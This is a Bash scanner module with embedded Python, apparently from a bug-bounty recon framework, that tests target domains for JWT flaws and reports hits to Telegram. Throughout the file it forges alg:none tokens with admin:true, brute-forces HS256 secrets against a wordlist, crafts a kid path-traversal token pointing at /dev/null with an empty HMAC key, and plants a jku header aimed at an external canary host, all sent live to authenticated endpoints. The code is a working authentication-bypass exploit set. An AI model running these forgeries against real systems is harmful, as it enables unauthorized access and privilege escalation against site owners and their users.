#!/usr/bin/env bash
# ============================================================
#  modules/45_jwt_scan.sh
#  Tier 2.8 — JWT vulnerability scanner
#
#  Detecta JWTs en respuestas (Set-Cookie, body, headers) y prueba 4 vectores:
#    1. alg:none accepted — forge JWT con alg=none, server acepta
#    2. Weak HS256 secret — brute-force con wordlist common
#    3. kid injection — kid header con path traversal / SQLi
#    4. jku/x5u SSRF — JWT con jku apuntando a canary externo
#
#  Anti-FP:
#    - Solo flag si el server PROCESA el JWT forged (200 con datos protegidos
#      o cambio de comportamiento vs request sin JWT)
#    - JWT debe ser válidamente decodificable (3 partes base64url)
# ============================================================

MODULE_NAME="jwt_scan"
MODULE_DESC="JWT — alg:none, weak secret, kid injection, jku SSRF"

_jwt_finding() {
  local DOMAIN_ID="$1" DOMAIN="$2" TARGET="$3"
  local TYPE="$4" SEV="$5" DETAIL="$6" CONF="${7:-medium}"

  db_add_finding "$DOMAIN_ID" "jwt" "$SEV" \
    "$TARGET" "$TYPE" "$DETAIL" "$CONF" 2>/dev/null

  local EMOJI="🔴"
  [[ "$SEV" == "high"   ]] && EMOJI="🟠"
  [[ "$SEV" == "medium" ]] && EMOJI="🟡"

  log_warn "  ⚡ [$SEV/$CONF] JWT $TYPE: $TARGET"

  if [[ "$CONF" != "low" ]] && [[ "$SEV" == "critical" || "$SEV" == "high" ]]; then
    _telegram_send "${EMOJI} *JWT — ${TYPE}*
🌐 \`${DOMAIN}\`
🔗 \`${TARGET}\`
📋 ${DETAIL:0:300}
📊 \`${SEV^^}\` / \`${CONF}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi
}

# ── Helpers JWT (Python embedded) ───────────────────────────
_jwt_decode_header() {
  local JWT="$1"
  local HEADER_B64="${JWT%%.*}"
  python3 -c "
import base64, json, sys
try:
    s = '${HEADER_B64}'
    s += '=' * (4 - len(s) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(s))))
except Exception:
    print('{}')
" 2>/dev/null
}

_jwt_decode_payload() {
  local JWT="$1"
  local PAYLOAD_B64
  PAYLOAD_B64=$(echo "$JWT" | cut -d'.' -f2)
  python3 -c "
import base64, json, sys
try:
    s = '${PAYLOAD_B64}'
    s += '=' * (4 - len(s) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(s))))
except Exception:
    print('{}')
" 2>/dev/null
}

# Forge JWT con alg:none, payload modificado
_jwt_forge_alg_none() {
  local PAYLOAD_JSON="$1"
  python3 -c "
import base64, json
def b64url(d):
    return base64.urlsafe_b64encode(d.encode()).decode().rstrip('=')
hdr = b64url(json.dumps({'alg':'none','typ':'JWT'}, separators=(',', ':')))
pld = b64url('${PAYLOAD_JSON}')
print(f'{hdr}.{pld}.')
" 2>/dev/null
}

# Forge JWT con HS256 + secret arbitrario
_jwt_forge_hs256() {
  local PAYLOAD_JSON="$1"
  local SECRET="$2"
  python3 -c "
import base64, hmac, hashlib, json
def b64url_str(d):
    return base64.urlsafe_b64encode(d.encode()).decode().rstrip('=')
def b64url_bytes(d):
    return base64.urlsafe_b64encode(d).decode().rstrip('=')
hdr_b64 = b64url_str(json.dumps({'alg':'HS256','typ':'JWT'}, separators=(',', ':')))
pld_b64 = b64url_str('${PAYLOAD_JSON}')
msg = (hdr_b64 + '.' + pld_b64).encode()
sig = hmac.new('${SECRET}'.encode(), msg, hashlib.sha256).digest()
print(f'{hdr_b64}.{pld_b64}.{b64url_bytes(sig)}')
" 2>/dev/null
}

# ── 1. Detectar JWTs en respuestas existentes ──────────────
# Buscar en js_secrets table (Tier 1.1) y crawler URLs.
_jwt_collect_samples() {
  local DOMAIN_ID="$1"
  # JWTs detectados por mod 11 (js_analyzer) en js_secrets
  sqlite3 "$DB_PATH" "
    SELECT DISTINCT secret_value FROM js_secrets
     WHERE domain_id=${DOMAIN_ID} AND secret_type LIKE '%JWT%'
     LIMIT 20;" 2>/dev/null
  # Findings con JWT en detail
  sqlite3 "$DB_PATH" "
    SELECT DISTINCT detail FROM findings
     WHERE domain_id=${DOMAIN_ID} AND detail LIKE '%eyJ%'
     LIMIT 20;" 2>/dev/null | grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+' | sort -u | head -10
}

# ── 2. Probar alg:none en endpoint protegido ────────────────
_jwt_test_alg_none() {
  local URL="$1" ORIGINAL_JWT="$2" DOMAIN_ID="$3" DOMAIN="$4"

  local PAYLOAD
  PAYLOAD=$(_jwt_decode_payload "$ORIGINAL_JWT")
  [[ "$PAYLOAD" == "{}" ]] && return 1

  # Modificar sub/role/admin a valor escalado
  local FORGED_PAYLOAD
  FORGED_PAYLOAD=$(echo "$PAYLOAD" | python3 -c "
import json, sys
try:
    p = json.load(sys.stdin)
    p['admin'] = True
    p['role'] = 'admin'
    p.pop('exp', None)
    print(json.dumps(p, separators=(',', ':')))
except Exception:
    print('')
" 2>/dev/null)
  [[ -z "$FORGED_PAYLOAD" ]] && return 1

  local FORGED_JWT
  FORGED_JWT=$(_jwt_forge_alg_none "$FORGED_PAYLOAD")
  [[ -z "$FORGED_JWT" ]] && return 1

  # Probar el forged JWT
  _h_get_noredirect "$URL" --connect-timeout 8 \
    -H "Authorization: Bearer ${FORGED_JWT}"
  local STATUS_FORGED="$HTTP_LAST_STATUS"
  local BODY_FORGED="${HTTP_LAST_BODY:0:2000}"

  # Sin JWT (baseline)
  _h_get_noredirect "$URL" --connect-timeout 8
  local STATUS_NONE="$HTTP_LAST_STATUS"

  # Si el server acepta el alg:none JWT (200) y baseline sin JWT da 401/403,
  # entonces alg:none es accepted = critical RCE/auth bypass
  if [[ "$STATUS_FORGED" == "200" ]] && [[ "$STATUS_NONE" =~ ^(401|403)$ ]]; then
    _jwt_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
      "alg_none_accepted" "critical" \
      "JWT alg:none aceptado — auth bypass total. Forged JWT con admin:true acepta y baseline sin JWT da $STATUS_NONE. Forged: ${FORGED_JWT:0:80}..." \
      "high"
    return 0
  fi
  return 1
}

# ── 3. Brute-force HS256 secret ─────────────────────────────
_jwt_test_weak_secret() {
  local URL="$1" ORIGINAL_JWT="$2" DOMAIN_ID="$3" DOMAIN="$4"

  # Comprobar que es HS256 (no RS256)
  local HEADER
  HEADER=$(_jwt_decode_header "$ORIGINAL_JWT")
  if ! echo "$HEADER" | grep -qiE '"alg":\s*"HS256"'; then
    return 1
  fi

  # Wordlist short (top secrets observados en BBP)
  local WORDLIST=("secret" "key" "jwt" "hackeadora" "1234" "password" "admin" "default"
                  "your-256-bit-secret" "your_secret_key" "supersecret" "changeme"
                  "test" "demo" "dev" "example" "JWT_SECRET" "node" "express"
                  "abc123" "qwerty" "letmein" "welcome" "iloveyou")

  local SIG="${ORIGINAL_JWT##*.}"
  local MSG="${ORIGINAL_JWT%.*}"

  for SECRET in "${WORDLIST[@]}"; do
    local COMPUTED_SIG
    COMPUTED_SIG=$(python3 -c "
import base64, hmac, hashlib
sig = hmac.new('${SECRET}'.encode(), '${MSG}'.encode(), hashlib.sha256).digest()
print(base64.urlsafe_b64encode(sig).decode().rstrip('='))
" 2>/dev/null)

    if [[ "$COMPUTED_SIG" == "$SIG" ]]; then
      _jwt_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
        "weak_hs256_secret" "critical" \
        "JWT HS256 firmado con secret débil: '${SECRET}' — atacante puede forgear cualquier JWT con role/admin escalado. Original JWT: ${ORIGINAL_JWT:0:60}..." \
        "high"
      return 0
    fi
  done
  return 1
}

# ── 4. kid injection (path traversal/SQLi) ──────────────────
_jwt_test_kid_injection() {
  local URL="$1" ORIGINAL_JWT="$2" DOMAIN_ID="$3" DOMAIN="$4"

  local PAYLOAD
  PAYLOAD=$(_jwt_decode_payload "$ORIGINAL_JWT")
  [[ "$PAYLOAD" == "{}" ]] && return 1

  # Forge JWT con kid path traversal — apuntando a /dev/null para HMAC con secret vacío
  # Trick: si server lee key file por kid, /dev/null da empty key; firmamos con HS256 + empty
  local FORGED_JWT
  FORGED_JWT=$(python3 -c "
import base64, hmac, hashlib, json
def b64url_str(d): return base64.urlsafe_b64encode(d.encode()).decode().rstrip('=')
def b64url_bytes(d): return base64.urlsafe_b64encode(d).decode().rstrip('=')
hdr = json.dumps({'alg':'HS256','typ':'JWT','kid':'../../../../../../dev/null'}, separators=(',', ':'))
hb = b64url_str(hdr)
pb = b64url_str('${PAYLOAD}')
msg = (hb + '.' + pb).encode()
# Empty key (since /dev/null read returns empty)
sig = hmac.new(b'', msg, hashlib.sha256).digest()
print(f'{hb}.{pb}.{b64url_bytes(sig)}')
" 2>/dev/null)
  [[ -z "$FORGED_JWT" ]] && return 1

  _h_get_noredirect "$URL" --connect-timeout 8 \
    -H "Authorization: Bearer ${FORGED_JWT}"
  local STATUS="$HTTP_LAST_STATUS"
  if [[ "$STATUS" == "200" ]]; then
    # Confirmar con baseline sin JWT
    _h_get_noredirect "$URL" --connect-timeout 8
    if [[ "$HTTP_LAST_STATUS" =~ ^(401|403)$ ]]; then
      _jwt_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
        "kid_path_traversal" "critical" \
        "JWT kid injection (../../dev/null) acepta firma HMAC-vacía — server lee key file por kid sin sanitización. Forged JWT: ${FORGED_JWT:0:80}..." \
        "high"
      return 0
    fi
  fi
  return 1
}

# ── 5. jku SSRF (opt-in con JWT_CANARY env) ─────────────────
_jwt_test_jku_ssrf() {
  local URL="$1" ORIGINAL_JWT="$2" DOMAIN_ID="$3" DOMAIN="$4"
  [[ -z "${JWT_CANARY:-}" ]] && return 1  # opt-in

  local PAYLOAD
  PAYLOAD=$(_jwt_decode_payload "$ORIGINAL_JWT")
  [[ "$PAYLOAD" == "{}" ]] && return 1

  # JWT con jku apuntando a canary
  local FORGED_JWT
  FORGED_JWT=$(python3 -c "
import base64, hmac, hashlib, json
def b64url_str(d): return base64.urlsafe_b64encode(d.encode()).decode().rstrip('=')
def b64url_bytes(d): return base64.urlsafe_b64encode(d).decode().rstrip('=')
hdr = json.dumps({'alg':'RS256','typ':'JWT','jku':'https://${JWT_CANARY}/jwks-jku-probe.json'}, separators=(',', ':'))
hb = b64url_str(hdr); pb = b64url_str('${PAYLOAD}')
# Sig invalid pero nos basta con que el server fetch el jku URL
print(f'{hb}.{pb}.SIGNATURE_NOT_VALID')
" 2>/dev/null)
  [[ -z "$FORGED_JWT" ]] && return 1

  _h_get_noredirect "$URL" --connect-timeout 8 \
    -H "Authorization: Bearer ${FORGED_JWT}"

  log_info "  JWT jku SSRF probe enviado para $URL — verifica logs de $JWT_CANARY"
  # No detectamos en respuesta — el atacante checkea sus logs
  return 0
}

# ── Main ─────────────────────────────────────────────────────
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 45 — $MODULE_DESC: $DOMAIN"

  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null || true
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null || true

  # 1. Recolectar JWT samples desde DB
  local JWT_SAMPLES
  JWT_SAMPLES=$(_jwt_collect_samples "$DOMAIN_ID" | grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+' | sort -u | head -10)

  if [[ -z "$JWT_SAMPLES" ]]; then
    log_info "  Sin JWTs en DB (js_secrets/findings) — saltando"
    return 0
  fi

  local JWT_COUNT
  JWT_COUNT=$(echo "$JWT_SAMPLES" | grep -c .)
  log_info "  ${JWT_COUNT} JWT samples encontrados"

  # 2. Endpoints candidatos (auth-protected): /api/, /me, /admin, etc.
  local AUTH_ENDPOINTS
  AUTH_ENDPOINTS=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND (url LIKE '%/api/%' OR url LIKE '%/me%' OR url LIKE '%/admin%'
            OR url LIKE '%/account%' OR url LIKE '%/profile%')
       AND url NOT LIKE '%.css%' AND url NOT LIKE '%.js%'
     LIMIT 20;" 2>/dev/null | sort -u)

  if [[ -z "$AUTH_ENDPOINTS" ]]; then
    log_info "  Sin auth endpoints candidatos en DB — saltando"
    return 0
  fi

  local ENDPOINT_COUNT
  ENDPOINT_COUNT=$(echo "$AUTH_ENDPOINTS" | grep -c .)
  log_info "  ${ENDPOINT_COUNT} auth endpoints candidatos"

  local TOTAL_FINDINGS=0
  while IFS= read -r JWT; do
    [[ -z "$JWT" ]] && continue
    log_info "  → JWT: ${JWT:0:40}..."

    # Por cada JWT, probar contra los endpoints
    local TESTED=0
    while IFS= read -r URL; do
      [[ -z "$URL" ]] && continue
      ((TESTED++))
      [[ "$TESTED" -gt 5 ]] && break  # cap 5 endpoints por JWT

      _jwt_test_alg_none "$URL" "$JWT" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL_FINDINGS++))
      _jwt_test_weak_secret "$URL" "$JWT" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL_FINDINGS++))
      _jwt_test_kid_injection "$URL" "$JWT" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL_FINDINGS++))
      _jwt_test_jku_ssrf "$URL" "$JWT" "$DOMAIN_ID" "$DOMAIN"
    done <<< "$AUTH_ENDPOINTS"
  done <<< "$JWT_SAMPLES"

  log_ok "$MODULE_DESC: ${TOTAL_FINDINGS} findings sobre ${JWT_COUNT} JWTs × ${ENDPOINT_COUNT} endpoints"
}
